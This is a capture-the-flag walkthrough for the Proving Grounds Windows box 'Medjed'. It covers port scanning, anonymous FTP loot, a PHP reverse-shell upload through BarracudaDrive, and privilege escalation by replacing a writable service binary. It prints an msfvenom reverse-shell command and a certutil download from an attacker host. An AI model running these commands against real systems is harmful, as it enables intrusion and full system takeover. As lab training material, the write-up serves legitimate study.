# Medjed
* Origin: Proving Grounds (OffSec)
* Difficulty: Intermediate
* OS: Windows

## Enumeration
Ran a quick rustscan to get an idea of what we're dealing with.
```
rustscan -a 192.168.230.127
```
![](img/rustscan.png)

A bunch of microsoft service related ports, mysql server, and http server are the obvious standouts. The higher number ports are a bit unfamiliar. Port 49664 and up are Microsoft related, but 30021, 33033, 44330, 45332, and 45443 might need a bit more investigation.

Navigating to the web server on port 8000 we are greeted by this beauty:

![](img/barracuda_home.png)

BarracudaDrive CMS default page. The about tab says the version is 6.5. Clicking on the config wizard link we are prompted to set up an admin account, implying this must be a fresh installation which was never properly set up.

![](img/barracuda_admin_setup.png)

Upon creating an admin account we have the ability to upload files to the web-file-server, create new pages, and upload images. It also looks like there's a possible privilege escalation vector for this version of BarracudaDrive, described [here](https://www.exploit-db.com/exploits/48789), but we need initial access before we can do anything with that. Coming back to this after investigating some of the other ports.

Tried enumerating the mysql server using msf aux payloads.
```
auxiliary/scanner/mysql/mysql_version
auxiliary/admin/mysql/mysql_enum
```
Wasn't able to get anything useful.

I noticed ports 30021 and port 3306 were unfamiliar to me, so ran a nmap scan targeting them
```
nmap -A -p 30021,33033 192.168.230.127
```
![](img/nmap_altports.png)

Looks like port 30021 is running a ftp server with anonymous logon enabled and port 33033 is running a web server.

Downloaded what appears to be a git repo from the ftp server.
```
wget -m ftp://anonymous:anonymous@192.168.230.127:30021
```
Looks like it's some kind of skeleton for a Ruby on Rails server. Not sure if they're just default settings but found potentially useful secrets in config/secrets.yaml.
```
development:
  secret_key_base: 36c569c923cac0e10cddd6588b468d09e82eb8a3a25cee7274f1a6680fb0cb19f6c1a64cad5c57923aa4b89675315c9202a5ff8db67f84a150668d6949cc0846

test:
  secret_key_base: be9463a08fe11dd60d1ff4bd361392f994f5365445b6685b86ac65fa08d1a2c8772068af773f31b758475849117a231dc51ac60f3a937539ceff9dc3a3668c48
```
Didn't find anything else immediately useful so shifted attention to the web server on port 33033. The home page has a list of employees with potentially useful usernames to spray, as well as a link to a login page.

![](img/port33033home.png)

Initial directory fuzzing found a page at /assets. Visiting it causes an error which potentially provides useful info. It looks like the git repo is potentially the skeleton for this site since they both run on Ruby.

![](img/ruby_error.png)

Did a few quick checks on the services running on the higher ports, found 45332 and 45443 are running a quiz app.

## Initial Access Through BarracudaDrive
Exploring the BarracudaDrive server further, it looks like the web-file-server at /fs allows us to view and upload files to the host's C drive. Navigating around, the C/xampp/htdocs directory looks like at hosts the files for the quiz on ports 45332 and 45443. Upon attempting to upload a test.txt file, we get an error saying the name is invalid. This likely means the extension is disallowed. There is a phpinfo.php file already in this directory, so php support must exist. Uploading a test.php file works and we're able to access it when visiting the url.

![](img/quiz_dir.png)

From here, trying to get a php reverse shell might be useful. After setting up a netcat listener, uploading the php reverse shell file from [here](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php), and visiting the url for the php file on port 45332, we get a shell as the user jerren.

![](img/php_rev_shell.png)

## Privilege Escalation
The PE PoC for BarracudaDrive v6.5 mentioned during enumeration takes advantage of insecure file permissions for the bd service in C:\bd\bd.exe. If we swap the bd.exe file for another with the same name and restart the system, we can execute whatever code we want as an admin beacause the bd service runs with system level privileges by default.

Check our initial user privileges:
```
whoami /priv
```

![](img/privs.png)

Verify we have the proper file permissions:
```
icacls C:\bd\bd.exe
```
![](img/bd_perms.png)

(The M permission for authenticated users shows us we can modify the exe)

Verify the service exists:
```
sc qc bd
```

![](img/verify_service.png)

Looks like we have the proper conditions. First rename the orginal bd.exe to something else as a backup.

Using msfvenom to create a reverse shell as our new exe:
```
msfvenom -p windows/x64/shell_reverse_tcp lhost=192.168.x.x lport=445 -f exe -o bd.exe
```
Serve with a python server from attacking machine, download on target host:
```
(kali) python3 -m http.server 80
(target) certutil -urlcache -f http://<attacker IP>/bd.exe bd.exe
```
After setting up a listener for the incoming reverse shell we can restart the computer.
```
shutdown /r -t 5
```
Wait a few seconds for reboot and we get a reverse shell with system level privileges.

![](img/root.png)


